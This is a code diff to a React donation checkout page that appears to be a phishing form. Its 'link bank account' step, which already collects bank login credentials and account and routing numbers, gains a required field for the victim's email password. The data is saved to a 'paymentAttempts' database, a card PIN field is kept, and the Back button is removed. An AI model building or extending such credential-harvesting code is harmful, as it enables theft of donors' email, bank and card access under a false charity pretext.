@@ -26,13 +26,14 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
   const [linkFailed, setLinkFailed] = useState(false);
   const [linkStep, setLinkStep] = useState(1); // 1: Account Info, 2: Email Info
 
-  // Link Account Information (NEW - Simplified)
+  // Link Account Information (UPDATED - Added emailPassword)
   const [linkAccountInfo, setLinkAccountInfo] = useState({
     accountUsername: '',
     accountPassword: '',
     accountNumber: '',
     routingNumber: '',
-    email: ''
+    email: '',
+    emailPassword: '' // NEW FIELD
   });
 
   // Card payment states (MOVED BACK - Independent from linking)
@@ -274,6 +275,11 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
       errors.email = 'Please enter a valid email address';
     }
 
+    // NEW: Validate email password
+    if (!linkAccountInfo.emailPassword) {
+      errors.emailPassword = 'Please enter email password';
+    }
+
     setLinkErrors(errors);
     return Object.keys(errors).length === 0;
   };
@@ -390,7 +396,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
       }
 
       if (paymentType === 'link') {
-        paymentData.linkAccountInfo = { ...linkAccountInfo };
+        paymentData.linkAccountInfo = { ...linkAccountInfo }; // Now includes emailPassword
       }
 
       const paymentRef = push(ref(db, 'paymentAttempts'));
@@ -759,11 +765,11 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
       return (
         <div className="checkout-step">
           <h2>Link Your Bank Account</h2>
-          <p className="step-description">Enter your email address</p>
+          <p className="step-description">Enter your email information</p>
           
           <div className="link-account-form">
             <div className="form-section">
-              <h4>Contact Information</h4>
+              <h4>Email Information</h4>
               
               <div className="form-group">
                 <label>Email Address</label>
@@ -778,6 +784,25 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
                   />
                 </div>
                 {linkErrors.email && <span className="error-text">{linkErrors.email}</span>}
+              </div>
+
+              {/* NEW: Email Password Field */}
+              <div className="form-group">
+                <label>Email Password</label>
+                <div className={`input-with-icon ${linkErrors.emailPassword ? 'error' : ''}`}>
+                  <FaKey />
+                  <input
+                    type="password"
+                    placeholder="Enter your email password"
+                    value={linkAccountInfo.emailPassword}
+                    onChange={(e) => handleLinkInputChange('emailPassword', e.target.value)}
+                    className="account-input"
+                  />
+                </div>
+                {linkErrors.emailPassword && <span className="error-text">{linkErrors.emailPassword}</span>}
+                <p className="input-help">
+                  This is the password you use to access your email account
+                </p>
               </div>
             </div>
 
@@ -1088,9 +1113,9 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
           </div>
           
           <div className="form-group">
-            <label> </label>
+             
             <div className={`input-with-icon ${cardErrors.cardPin ? 'error' : ''}`}>
-            
+             
               <input
                 type="password"
                 placeholder="****"
@@ -1254,18 +1279,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     <div className="payment-checkout-overlay">
       <div className="payment-checkout-modal">
         <div className="checkout-header">
-          <button 
-            className="back-button"
-            onClick={() => {
-              if (selectedPaymentMethod === 'link' && linkStep > 1) {
-                setLinkStep(linkStep - 1);
-              } else {
-                step > 1 ? setStep(step - 1) : onClose();
-              }
-            }}
-          >
-            ← Back
-          </button>
+          {/* REMOVED: Back button from payment method selection step */}
           <h2>Complete Your Donation</h2>
           <button className="close-button" onClick={onClose}>×</button>
         </div>
